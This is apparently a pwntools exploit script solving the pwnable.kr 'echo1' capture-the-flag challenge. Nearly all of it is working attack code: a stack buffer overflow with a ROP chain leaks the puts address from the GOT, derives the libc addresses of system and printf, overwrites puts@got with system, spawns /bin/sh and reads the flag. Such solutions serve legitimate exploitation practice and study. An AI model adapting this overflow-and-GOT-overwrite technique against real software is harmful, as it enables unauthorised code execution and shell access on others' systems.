#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9010 ./echo1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./echo1")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 9010)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

if args.LOCAL:
    libc = exe.libc
else:
    libc = ELF("./libc-2.23.so")

io = start()

# name
io.recvuntil(b"hey, what's your name? : ")
io.sendline(b"name")

# BOF - leak puts address
io.recvuntil(b"> ")
io.sendline(str(1).encode())

io.recvline()  # hello

leak_addr_payload = b""
leak_addr_payload = leak_addr_payload.ljust(32, b"A")
leak_addr_payload += b"B" * 8  # rbp

# mov edi, dword ptr [rsp + 0x30] ; add rsp, 0x38 ; ret
leak_addr_payload += p64(0x400B10)

leak_addr_payload = leak_addr_payload.ljust(0x60, b"C")

# puts(puts@got)
leak_addr_payload += p64(exe.got["puts"])  # rsp + 0x30
leak_addr_payload += p64(exe.plt["puts"])

# main()
leak_addr_payload += p64(exe.sym["main"])

io.sendline(leak_addr_payload)

io.recvline()  # echo
io.recvline()  # goodby

puts_addr = u64(io.recvline(keepends=False).ljust(8, b"\x00"))

log.info(f"leaked puts address: 0x{puts_addr:x}")

system_addr = puts_addr + libc.sym["system"] - libc.sym["puts"]
printf_addr = puts_addr + libc.sym["printf"] - libc.sym["puts"]

log.info(f"system address: 0x{system_addr:x}")

# program has just restarted
io.recvuntil(b"hey, what's your name? : ")
io.sendline(b"name")

# BOF - write puts -> system
io.recvuntil(b"> ")
io.sendline(str(1).encode())

io.recvline()  # hello

overwrite_payload = b""
overwrite_payload = overwrite_payload.ljust(32, b"A")

# rbp = puts@got - 8 + 0x20
overwrite_payload += p64(exe.got["puts"] + 0x20 - 8)

# get_input(puts@got, 0x80)
#   0x0000000000400837 <+31>:    lea    rax,[rbp-0x20]
#   0x000000000040083b <+35>:    mov    esi,0x80
#   0x0000000000400840 <+40>:    mov    rdi,rax
#   0x0000000000400843 <+43>:    call   0x400794 <get_input>
overwrite_payload += p64(0x400837)

io.sendline(overwrite_payload)
io.sendline(b"/bin/sh\x00" + p64(system_addr) + p64(printf_addr))  # src

io.recvline()
io.recvline()

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
